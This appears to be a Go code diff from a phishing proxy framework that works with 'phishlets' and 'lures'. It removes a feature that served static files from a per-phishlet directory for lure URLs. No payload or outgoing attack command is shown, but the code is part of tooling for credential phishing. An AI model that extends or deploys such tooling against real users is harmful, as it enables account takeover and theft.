@@ -79,7 +79,6 @@ type Config struct {
 	phishletNames   []string
 	activeHostnames []string
 	redirectorsDir  string
-	staticDir       string
 	lures           []*Lure
 	lureIds         []string
 	subphishlets    []*SubPhishlet
@@ -399,10 +398,6 @@ func (c *Config) SetRedirectorsDir(path string) {
 	c.redirectorsDir = path
 }
 
-func (c *Config) SetStaticDir(path string) {
-	c.staticDir = path
-}
-
 func (c *Config) ResetAllSites() {
 	c.phishletConfig = make(map[string]*PhishletConfig)
 	c.SavePhishlets()
@@ -702,25 +697,6 @@ func (c *Config) GetLureByPath(site string, path string) (*Lure, error) {
 	return nil, fmt.Errorf("lure for path '%s' not found", path)
 }
 
-func (c *Config) GetLureStaticByPath(site string, path string) (string, error) {
-splits := strings.Split(strings.TrimLeft(path, "/"), "/")
-	for _, l := range c.lures {
-		if l.Phishlet == site {
-			if l.Path == "/" + splits[0] && splits[1] == "static" {
-				if base_path, _ := c.GetStaticDir(l.Phishlet); base_path != "" {
-					full_path := filepath.Join(append([]string{base_path}, splits[2:]...)...)
-					if _, err := os.Stat(full_path); os.IsNotExist(err) {
-					    return "", fmt.Errorf("file does not exist at path: %s", full_path)
-					}
-					return full_path, nil
-				} 
-				return "", fmt.Errorf("static lure path '%s' not found", path)
-			}
-		}
-	}
-	return "", nil
-}
-
 func (c *Config) GetPhishlet(site string) (*Phishlet, error) {
 	pl, ok := c.phishlets[site]
 	if !ok {
@@ -769,16 +745,6 @@ func (c *Config) GetDnsPort() int {
 
 func (c *Config) GetRedirectorsDir() string {
 	return c.redirectorsDir
-}
-
-func (c *Config) GetStaticDir(pName string) (string, error) {
-	if c.staticDir == "" {
-		return "", fmt.Errorf("Static dir not set")
-	}
-	if pName == "" {
-		return "", fmt.Errorf("Phishlet name cannot be empty")
-	}
-	return filepath.Join(c.staticDir, pName), nil
 }
 
 func (c *Config) GetBlacklistMode() string {
